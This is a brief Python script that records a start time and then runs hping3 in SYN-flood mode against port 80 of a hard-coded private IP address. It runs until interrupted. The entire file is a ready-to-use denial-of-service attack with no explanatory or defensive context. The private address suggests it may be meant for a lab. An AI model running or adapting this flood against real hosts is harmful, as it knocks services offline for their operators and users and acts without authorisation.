import os
import sys
import signal
import time
from datetime import datetime

ip_address = "10.50.10.11"
try:
    datetime_start = datetime.now()
    print("[log] Connection started at ", datetime_start)
    print("")
    os.system("hping3 -S --flood -V -p 80 " + ip_address)
except KeyboardInterrupt:
    #os.system("pkill hping3")
    sys.exit(0)
